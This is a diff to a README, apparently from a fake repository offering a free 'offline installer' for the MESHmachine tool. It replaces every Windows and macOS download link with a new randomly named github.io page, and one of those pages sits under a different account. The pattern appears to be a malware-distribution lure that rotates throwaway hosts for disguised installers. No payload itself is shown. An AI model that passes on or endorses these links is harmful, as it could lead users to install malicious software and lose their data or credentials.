@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_MESHmachine-555555?style=for-the-badge&logo=github)](https://zqhzqrfmocza.github.io/win-release/)
+[![Download](https://img.shields.io/badge/⬇_Download_MESHmachine-555555?style=for-the-badge&logo=github)](https://zfboreoxhmwh.github.io/win-dl/)
 
 </div>
 
@@ -58,9 +58,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zqhzqrfmocza.github.io/win-release/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zfboreoxhmwh.github.io/win-dl/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zqhzqrfmocza.github.io/mac-release/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://FlagArcher36.github.io/macos-pkg/)
 
 </div>
 
@@ -106,7 +106,7 @@ This repository provides an **offline installer** for evaluation and educational
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/⬇_Download_Now-555555?style=for-the-badge&logo=github)](https://zqhzqrfmocza.github.io/win-release/)
+[![Download Now](https://img.shields.io/badge/⬇_Download_Now-555555?style=for-the-badge&logo=github)](https://zfboreoxhmwh.github.io/win-dl/)
 
 <img src="https://skillicons.dev/icons?i=windows,apple,github" />
 
